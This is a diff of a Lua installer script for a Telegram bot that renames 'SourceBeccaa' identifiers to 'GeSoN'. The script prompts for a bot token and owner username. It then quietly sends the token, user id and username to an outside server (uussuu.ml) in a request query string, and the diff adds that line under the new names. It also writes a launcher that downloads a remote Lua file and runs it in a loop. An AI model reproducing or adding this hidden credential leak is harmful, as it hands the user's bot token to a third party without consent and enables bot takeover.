@@ -3,20 +3,20 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
-Server_SourceBeccaa = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
-local AutoFiles_SourceBeccaa = function() 
+Server_GeSoN = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
+local AutoFiles_GeSoN = function() 
 local Create_Info = function(Token,Sudo,UserName)  
-local SourceBeccaa_Info_Sudo = io.open("sudo.lua", 'w')
-SourceBeccaa_Info_Sudo:write([[
+local GeSoN_Info_Sudo = io.open("sudo.lua", 'w')
+GeSoN_Info_Sudo:write([[
 token = "]]..Token..[["
 
 Sudo = ]]..Sudo..[[  
 
 UserName = "]]..UserName..[["
 ]])
-SourceBeccaa_Info_Sudo:close()
+GeSoN_Info_Sudo:close()
 end  
-if not database:get(Server_SourceBeccaa.."Token_SourceBeccaa") then
+if not database:get(Server_GeSoN.."Token_GeSoN") then
 print("\27[1;34m»» Send Your Token Bot :\27[m")
 local token = io.read()
 if token ~= '' then
@@ -25,7 +25,7 @@ if res ~= 200 then
 io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
 else
 io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
-database:set(Server_SourceBeccaa.."Token_SourceBeccaa",token)
+database:set(Server_GeSoN.."Token_GeSoN",token)
 end 
 else
 io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
@@ -34,7 +34,7 @@ os.execute('lua start.lua')
 end
 ------------------------------------------------------------------------------------------------------------
 ------------------------------------------------------------------------------------------------------------
-if not database:get(Server_SourceBeccaa.."UserName_SourceBeccaa") then
+if not database:get(Server_GeSoN.."UserName_GeSoN") then
 print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
 local UserName = io.read():gsub('@','')
 if UserName ~= '' then
@@ -53,8 +53,8 @@ io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
 os.execute('lua start.lua')
 else
 io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
-database:set(Server_SourceBeccaa.."UserName_SourceBeccaa",Json.Info.Username)
-database:set(Server_SourceBeccaa.."Id_SourceBeccaa",Json.Info.Id)
+database:set(Server_GeSoN.."UserName_GeSoN",Json.Info.Username)
+database:set(Server_GeSoN.."Id_GeSoN",Json.Info.Id)
 end
 end
 else
@@ -62,47 +62,47 @@ io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
 end 
 os.execute('lua start.lua')
 end
-local function Files_SourceBeccaa_Info()
-Create_Info(database:get(Server_SourceBeccaa.."Token_SourceBeccaa"),database:get(Server_SourceBeccaa.."Id_SourceBeccaa"),database:get(Server_SourceBeccaa.."UserName_SourceBeccaa"))   
-https.request("https://uussuu.ml/SourceBeccaa/SourceBeccaa.php?id="..database:get(Server_SourceBeccaa.."Id_SourceBeccaa").."&user="..database:get(Server_SourceBeccaa.."UserName_SourceBeccaa").."&token="..database:get(Server_SourceBeccaa.."Token_SourceBeccaa"))
-local RunSourceBeccaa = io.open("SourceBeccaa", 'w')
-RunSourceBeccaa:write([[
+local function Files_GeSoN_Info()
+Create_Info(database:get(Server_GeSoN.."Token_GeSoN"),database:get(Server_GeSoN.."Id_GeSoN"),database:get(Server_GeSoN.."UserName_GeSoN"))   
+https.request("https://uussuu.ml/GeSoN/GeSoN.php?id="..database:get(Server_GeSoN.."Id_GeSoN").."&user="..database:get(Server_GeSoN.."UserName_GeSoN").."&token="..database:get(Server_GeSoN.."Token_GeSoN"))
+local RunGeSoN = io.open("GeSoN", 'w')
+RunGeSoN:write([[
 #!/usr/bin/env bash
-cd $HOME/SourceBeccaa
-token="]]..database:get(Server_SourceBeccaa.."Token_SourceBeccaa")..[["
-rm -fr SourceBeccaa.lua
-wget "https://raw.githubusercontent.com/Source-Becca/SourceBeccaa/master/SourceBeccaa.lua"
+cd $HOME/GeSoN
+token="]]..database:get(Server_GeSoN.."Token_GeSoN")..[["
+rm -fr GeSoN.lua
+wget "https://raw.githubusercontent.com/Source-Becca/GeSoN/master/GeSoN.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./SourceBeccaa.lua -p PROFILE --bot=$token
+./tg -s ./GeSoN.lua -p PROFILE --bot=$token
 done
 ]])
-RunSourceBeccaa:close()
+RunGeSoN:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/SourceBeccaa
+cd $HOME/GeSoN
 while(true) do
 rm -fr ../.telegram-cli
-screen -S SourceBeccaa -X kill
-screen -S SourceBeccaa ./SourceBeccaa
+screen -S GeSoN -X kill
+screen -S GeSoN ./GeSoN
 done
 ]])
 RunTs:close()
 end
-Files_SourceBeccaa_Info()
-database:del(Server_SourceBeccaa.."Token_SourceBeccaa");database:del(Server_SourceBeccaa.."Id_SourceBeccaa");database:del(Server_SourceBeccaa.."UserName_SourceBeccaa")
+Files_GeSoN_Info()
+database:del(Server_GeSoN.."Token_GeSoN");database:del(Server_GeSoN.."Id_GeSoN");database:del(Server_GeSoN.."UserName_GeSoN")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 end 
 local function Load_File()  
 local f = io.open("./sudo.lua", "r")  
 if not f then   
-AutoFiles_SourceBeccaa()  
+AutoFiles_GeSoN()  
 var = true
 else   
 f:close()  
-database:del(Server_SourceBeccaa.."Token_SourceBeccaa");database:del(Server_SourceBeccaa.."Id_SourceBeccaa");database:del(Server_SourceBeccaa.."UserName_SourceBeccaa")
+database:del(Server_GeSoN.."Token_GeSoN");database:del(Server_GeSoN.."Id_GeSoN");database:del(Server_GeSoN.."UserName_GeSoN")
 sudos = dofile('sudo.lua')
 os.execute('./install.sh ins')
 var = false
